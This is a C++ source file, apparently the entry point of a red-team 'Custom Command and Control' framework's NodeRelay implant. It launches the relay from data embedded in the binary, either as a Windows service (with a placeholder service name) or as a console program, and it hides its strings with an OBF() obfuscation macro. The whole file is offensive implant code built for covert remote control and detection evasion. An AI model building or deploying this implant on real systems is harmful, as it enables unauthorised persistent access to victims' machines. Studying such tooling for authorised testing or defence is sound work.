#include "StdAfx.h"

/// Implementation of a service that runs a NodeRelay.
struct NodeRelayService : FSecure::CppCommons::WinTools::AbstractService
{
	/// Service main function, an WinTools::Services::AbstractService overload.
	/// @return always returns NO_ERROR.
	FSecure::CppCommons::CppTools::XError<FSecure::CppCommons::CppTools::SystemErrorCode> OnServiceRun() override
	{
		// Just try and start the NodeRelay.
		FSecure::C3::Utils::CreateNodeRelayFromImagePatch([](FSecure::C3::LogMessage const&, std::string_view*) {}, FSecure::C3::InterfaceFactory::Instance(), EmbeddedData::Instance()[0], EmbeddedData::Instance()[1], EmbeddedData::Instance()[2], EmbeddedData::Instance().FindMatching(3));
		return NO_ERROR;
	}
};

void Log(FSecure::C3::LogMessage const& message, std::string_view* sender)
{
	// Synchronize and show message on screen.
	static std::mutex mutex;
	std::lock_guard lock(mutex);
	std::cout << FSecure::C3::Utils::ConvertLogMessageToConsoleText(OBF("Node"), message, sender) << std::endl;
}

/// Entry point of the application.
/// @param argc number of program arguments.
/// @param argv vector of program arguments.
int main(DWORD argc, char * argv[])
{
	FSecure::WinTools::StructuredExceptionHandling::SehWrapper(
		[]() {
			try
			{
				// Check if we're run as a Windows Service.
				NodeRelayService service;
				if (SUCCEEDED(FSecure::CppCommons::WinTools::Services::TryStartAsService(service, OBF(L"C3NodeRelayServiceName_Change_That"))))	// TODO: Change that!
					return;

				// If not then proceed as a user-land application.
				std::cout << OBF("Custom Command and Control - NodeRelayConsoleExe. BUILD: ") << OBF(C3_BUILD_VERSION) << std::endl << std::endl;
				std::cout << OBF("*> Starting NodeRelay.") << std::endl;
				FSecure::C3::Utils::CreateNodeRelayFromImagePatch(Log,
					FSecure::C3::InterfaceFactory::Instance(),
					EmbeddedData::Instance()[0],
					EmbeddedData::Instance()[1],
					EmbeddedData::Instance()[2],
					EmbeddedData::Instance().FindMatching(3))
					->Join();
			}
			catch (std::exception const& exception)
			{
				std::cerr << OBF("!> ") << exception.what() << OBF("\nProgram terminates.\n") << std::endl;
			}
			catch (...)
			{
				std::cerr << OBF("!> ") << OBF("\nCaught an unhandled exception.\n") << std::endl;
			}
		}, []() {}
	);

	return 0;
}
